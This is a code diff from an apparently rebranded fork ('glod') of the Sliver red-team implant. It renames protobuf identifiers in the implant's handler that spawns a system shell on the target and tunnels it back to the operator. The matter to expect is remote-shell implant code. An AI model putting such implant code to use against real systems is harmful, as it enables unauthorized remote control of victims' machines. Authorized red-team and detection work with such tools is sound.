@@ -29,19 +29,19 @@ import (
 	"github.com/starkzarn/glod/implant/sliver/shell"
 	"github.com/starkzarn/glod/implant/sliver/transports"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"google.golang.org/protobuf/proto"
 )
 
-func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func ShellReqHandler(envelope *glodpb.Envelope, connection *transports.Connection) {
 
-	shellReq := &sliverpb.ShellReq{}
+	shellReq := &glodpb.ShellReq{}
 	err := proto.Unmarshal(envelope.Data, shellReq)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[shell] Failed to unmarshal protobuf %s", err)
 		// {{end}}
-		shellResp, _ := proto.Marshal(&sliverpb.Shell{
+		shellResp, _ := proto.Marshal(&glodpb.Shell{
 			Response: &commonpb.Response{
 				Err: err.Error(),
 			},
@@ -56,7 +56,7 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		// {{if .Config.Debug}}
 		log.Printf("[shell] Failed to get system shell")
 		// {{end}}
-		shellResp, _ := proto.Marshal(&sliverpb.Shell{
+		shellResp, _ := proto.Marshal(&glodpb.Shell{
 			Response: &commonpb.Response{
 				Err: err.Error(),
 			},
@@ -70,7 +70,7 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		// {{if .Config.Debug}}
 		log.Printf("[shell] Failed to spawn! err: %v", err)
 		// {{end}}
-		shellResp, _ := proto.Marshal(&sliverpb.Shell{
+		shellResp, _ := proto.Marshal(&glodpb.Shell{
 			Response: &commonpb.Response{
 				Err: err.Error(),
 			},
@@ -91,12 +91,12 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	)
 	connection.AddTunnel(tunnel)
 
-	shellResp, _ := proto.Marshal(&sliverpb.Shell{
+	shellResp, _ := proto.Marshal(&glodpb.Shell{
 		Pid:      uint32(systemShell.Command.Process.Pid),
 		Path:     shellReq.Path,
 		TunnelID: shellReq.TunnelID,
 	})
-	connection.Send <- &sliverpb.Envelope{
+	connection.Send <- &glodpb.Envelope{
 		ID:   envelope.ID,
 		Data: shellResp,
 	}
@@ -109,12 +109,12 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 
 		systemShell.Stop()
 
-		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
+		tunnelClose, _ := proto.Marshal(&glodpb.TunnelData{
 			Closed:   true,
 			TunnelID: tunnel.ID,
 		})
-		connection.Send <- &sliverpb.Envelope{
-			Type: sliverpb.MsgTunnelClose,
+		connection.Send <- &glodpb.Envelope{
+			Type: glodpb.MsgTunnelClose,
 			Data: tunnelClose,
 		}
 	}
